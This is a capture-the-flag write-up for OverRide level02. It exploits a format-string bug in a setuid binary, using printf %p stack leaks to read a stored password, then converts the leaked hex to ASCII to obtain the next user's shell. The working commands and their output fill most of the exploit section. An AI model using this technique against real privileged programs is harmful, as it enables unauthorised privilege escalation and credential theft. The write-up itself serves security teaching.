# OverRide (level02)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/level02/level02`
- Type: **ELF 64-bit LSB executable** (`file -b ~/level02`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level02`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level02
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 /home/users/level02/level02
```

|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with level03's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level02
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are executable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

# Vulnerability & Analysis

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Externally-Controlled Format String" ([CWE-134](https://cwe.mitre.org/data/definitions/134.html)).

On the failure path, `printf(user_name)` uses our buffer as its format string, giving a read (`%p`, `%s`) and write (`%n`) primitive on the stack. That lets us read the real password straight off the stack.

# Exploit

`printf()` is variadic: it trusts the format string for its argument count. We control that string (`user_name`), so each specifier makes it fetch one more argument we never supplied.

On x86-64 ([SysV ABI](https://wiki.osdev.org/System_V_ABI)) the first 6 arguments are in registers and the rest on the stack. Our format string is the first, so the walk starts at the 2nd: `%p` reads the 5 remaining registers, then climbs the stack 8 bytes at a time.

## Locating `password` on the stack

The three buffers are contiguous on `main()`'s frame:  
`user_password` -> `password` -> `user_name`.

We put a marker in `user_password` and chain `%p`s in `user_name`. Spotting the marker in the leak tells us where the buffers begin, and `password` follows at a fixed offset.

Each `%p` prints one 8-byte word little-endian, so the marker `AAAABBBBCCCCDDDDEEEEFFFF` comes back byte-swapped per group if everything aligns faithfully: `0x4242424241414141 0x4444444443434343 0x4646464645454545`.

```sh
$ (printf '%s\n' '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'; printf '%s\n' 'AAAABBBBCCCCDDDDEEEEFFFF') | ~/level02
0x7fffffffe4d0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 0x4242424241414141 0x4444444443434343 0x4646464645454545 (nil) (nil) (nil) (nil) (nil) (nil) (nil)
```

The marker shows up at the **8th specifier** (the 8th 8-byte word), so `user_password` starts there.

`user_password` is 112 bytes long, and each specifier reads one 8-byte word, so it spans 112 / 8 = 14 words. `password` therefore begins 14 specifiers later: 8 + 14 = the **22nd specifier**.

## Leaking the password

Our first instinct would be to read the password from the 22nd specifier directly as a string.
```sh
$ (printf '%s\n' '%22$s'; printf '%s\n' '') | ~/level02
Segmentation fault
```
It fails because `%s` reads the slot as an address and dereferences it, but slot 22 *is* the raw password bytes, not a pointer to them, so it dereferences garbage.

We can instead read the words with `%p`. The `password` buffer is 48 bytes, which is 6 *(= 48 / 8)* 8-byte words, so we read 6 specifiers: 22 through 27.
```sh
$ (printf '%s\n' '%22$p %23$p %24$p %25$p %26$p %27$p'; printf '%s\n' '') | ~/level02
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil)
``` 

# Exploit

The password comes out as a 6 little-endian hex words (8 bytes).  
We wish to convert it to ASCII for ease of usage.  

```sh
$ flip_hex_words() { sed -E 's/(..)(..)(..)(..)(..)(..)(..)(..)/\8\7\6\5\4\3\2\1/'; };
$ hex_to_ascii() { tr -d '\n' | xxd -r -p; };

$ raw_password="$((printf '%s\n' '%22$p %23$p %24$p %25$p %26$p %27$p'; printf '%s\n' '') | ~/level02 | grep -oE '[0-9a-f]{16}')";
$ flipped_password="$(printf '%s' "$raw_password" | flip_hex_words)";
$ ascii_password="$(printf '%s' "$flipped_password" | hex_to_ascii)";

$ (printf '%s\n' 'level03'; printf '%s\n' "$ascii_password"; cat -) | ~/level02;
```

And there we are.
